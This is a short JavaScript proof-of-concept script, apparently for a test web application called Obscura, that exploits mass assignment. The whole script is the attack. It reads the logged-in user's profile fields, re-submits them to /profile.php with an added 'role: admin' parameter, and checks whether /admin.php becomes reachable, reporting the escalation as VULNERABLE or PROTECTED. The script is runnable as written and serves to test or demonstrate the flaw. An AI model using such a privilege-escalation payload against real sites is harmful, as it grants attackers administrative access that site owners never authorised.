(async () => {
  console.log("=== OBSCURA MASS ASSIGNMENT PoC ===");

  const profileResponse = await fetch("/profile.php", {
    credentials: "same-origin"
  });

  const profileHtml = await profileResponse.text();
  const doc = new DOMParser().parseFromString(profileHtml, "text/html");

  const username = doc.querySelector('input[name="username"]')?.value;
  const email = doc.querySelector('input[name="email"]')?.value;

  if (!username || !email) {
    console.error("Could not read profile. Log in first.");
    return;
  }

  const before = await fetch("/admin.php", {
    credentials: "same-origin",
    redirect: "manual"
  });

  console.log("Admin access BEFORE:", before.status);

  const response = await fetch("/profile.php", {
    method: "POST",
    credentials: "same-origin",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: new URLSearchParams({
      username,
      email,
      role: "admin"
    })
  });

  console.log("Profile update HTTP:", response.status);

  const after = await fetch("/admin.php", {
    credentials: "same-origin",
    redirect: "manual"
  });

  console.log("Admin access AFTER:", after.status);

  if (before.status === 403 && after.status === 200) {
    console.log("[+] VULNERABLE: User escalated privileges to admin.");
  } else if (before.status === 403 && after.status === 403) {
    console.log("[-] PROTECTED: User remains without admin access.");
  } else {
    console.log("[?] Inconclusive. Check the user's initial role.");
  }
})();
